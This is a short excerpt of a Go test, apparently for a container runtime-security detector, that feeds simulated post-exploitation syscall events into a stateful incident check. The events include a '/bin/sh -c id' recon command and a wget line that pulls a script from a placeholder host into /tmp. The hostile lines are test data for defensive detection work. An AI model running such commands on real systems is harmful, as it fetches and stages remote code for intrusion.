...
func TestRuntimeFlow_StatefulIncidents_ReconAndPostExploit(t *testing.T) {
	...
	payload = append(payload,
		map[string]interface{}{"pod": basePod, "syscall": "execve", "target": "/bin/sh -c id"},
		map[string]interface{}{"pod": basePod, "syscall": "execve", "target": "/tmp/wget http://x/p.sh -O /tmp/p.sh"},
	)
